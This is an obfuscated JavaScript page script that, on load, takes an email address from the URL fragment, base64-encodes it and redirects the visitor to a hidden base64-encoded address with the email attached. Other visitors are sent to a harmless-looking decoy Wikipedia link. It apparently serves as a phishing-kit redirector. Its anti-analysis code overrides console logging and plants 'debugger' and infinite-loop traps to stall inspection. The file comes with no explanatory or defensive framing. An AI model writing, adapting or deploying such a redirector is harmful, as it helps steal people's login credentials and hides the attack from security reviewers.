var link =
  'OTEzZlRIZ3FBRk42dmU4YlZXdGhkeHBEbndSMG16bHpNUTlxNjcxbVBENDV1MndTb0tzV2Z2bldLMGF3azF1SjJqS2ZZYmx6Wnl5TFpvNG5MaVVBVFNIbHBPY2dNNmJPU2c0QlA5WThjcm9DVkl5M05xam9ORFFMNWNrR01SMDVaMkVKclBYQkpGN0FHQ3hCaG83WThU'
var random =
  'aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9FbWFpbA=='
var autograb = false
const _0x6d4a3c = (function () {
    let _0x5cc2bf = true
    return function (_0x9b77da, _0x135712) {
      const _0xf77bb9 = _0x5cc2bf
        ? function () {
            if (_0x135712) {
              const _0x101ef2 = _0x135712.apply(_0x9b77da, arguments)
              return (_0x135712 = null), _0x101ef2
            }
          }
        : function () {}
      return (_0x5cc2bf = false), _0xf77bb9
    }
  })(),
  _0x487215 = _0x6d4a3c(this, function () {
    return _0x487215
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x487215)
      .search('(((.+)+)+)+$')
  })
_0x487215()
const _0x5dbfa7 = (function () {
  let _0x4b0e96 = true
  return function (_0xd5d4f3, _0xaef652) {
    const _0x53ffda = _0x4b0e96
      ? function () {
          if (_0xaef652) {
            const _0x48e2d4 = _0xaef652.apply(_0xd5d4f3, arguments)
            return (_0xaef652 = null), _0x48e2d4
          }
        }
      : function () {}
    return (_0x4b0e96 = false), _0x53ffda
  }
})()
;(function () {
  _0x5dbfa7(this, function () {
    const _0x97b71d = new RegExp('function *\\( *\\)'),
      _0x562d3b = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x4d3b42 = _0x3d6ca4('init')
    !_0x97b71d.test(_0x4d3b42 + 'chain') || !_0x562d3b.test(_0x4d3b42 + 'input')
      ? _0x4d3b42('0')
      : _0x3d6ca4()
  })()
})()
const _0x55444a = (function () {
    let _0x33f15b = true
    return function (_0x57a666, _0x260f9d) {
      const _0x31c56e = _0x33f15b
        ? function () {
            if (_0x260f9d) {
              const _0xb3158f = _0x260f9d.apply(_0x57a666, arguments)
              return (_0x260f9d = null), _0xb3158f
            }
          }
        : function () {}
      return (_0x33f15b = false), _0x31c56e
    }
  })(),
  _0x4f3632 = _0x55444a(this, function () {
    const _0x330ee3 = function () {
        let _0x14d87b
        try {
          _0x14d87b = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x4d6905) {
          _0x14d87b = window
        }
        return _0x14d87b
      },
      _0x131a47 = _0x330ee3(),
      _0x18e009 = (_0x131a47.console = _0x131a47.console || {}),
      _0x1706ee = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x3a4ef4 = 0; _0x3a4ef4 < _0x1706ee.length; _0x3a4ef4++) {
      const _0x5abefa = _0x55444a.constructor.prototype.bind(_0x55444a),
        _0x2ee7c2 = _0x1706ee[_0x3a4ef4],
        _0x5e394d = _0x18e009[_0x2ee7c2] || _0x5abefa
      _0x5abefa['__proto__'] = _0x55444a.bind(_0x55444a)
      _0x5abefa.toString = _0x5e394d.toString.bind(_0x5e394d)
      _0x18e009[_0x2ee7c2] = _0x5abefa
    }
  })
_0x4f3632()
function isValidEmail(_0x2f536f) {
  return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(_0x2f536f)
}
function decodeBase64(_0x2f7030) {
  try {
    return decodeURIComponent(atob(_0x2f7030))
  } catch (_0x99731e) {
    return ''
  }
}
function encodeBase64(_0x2d5b79) {
  try {
    return btoa(_0x2d5b79)
  } catch (_0x10a9ab) {
    return 'Error encoding string.'
  }
}
function handleRedirect() {
  let _0x3a9b99 = window.location.hash.substring(1)
  if (_0x3a9b99) {
    if (isValidEmail(_0x3a9b99)) {
      let _0x50733c = encodeBase64(_0x3a9b99)
      window.location.href =
        decodeBase64(link) + '/index?a=' + encodeURIComponent(_0x50733c)
    } else {
      let _0x561d74 = decodeBase64(_0x3a9b99)
      if (isValidEmail(_0x561d74)) {
        window.location.href =
          decodeBase64(link) + '/index?a=' + encodeURIComponent(_0x3a9b99)
      } else {
        let _0x4b04a9 = _0x3a9b99.substring(4, _0x3a9b99.length - 4),
          _0x1ccd27 = decodeBase64(_0x4b04a9)
        isValidEmail(_0x1ccd27)
          ? (window.location.href =
              decodeBase64(link) + '/index?a=' + encodeURIComponent(_0x4b04a9))
          : (window.location.href = decodeBase64(random))
      }
    }
  } else {
    autograb
      ? (window.location.href = decodeBase64(random))
      : (window.location.href = decodeBase64(link) + '/index')
  }
}
window.onload = handleRedirect
function _0x3d6ca4(_0x49d06c) {
  function _0x52894f(_0x3684e2) {
    if (typeof _0x3684e2 === 'string') {
      return function (_0x59470c) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x3684e2 / _0x3684e2).length !== 1 || _0x3684e2 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x52894f(++_0x3684e2)
  }
  try {
    if (_0x49d06c) {
      return _0x52894f
    } else {
      _0x52894f(0)
    }
  } catch (_0x578219) {}
}
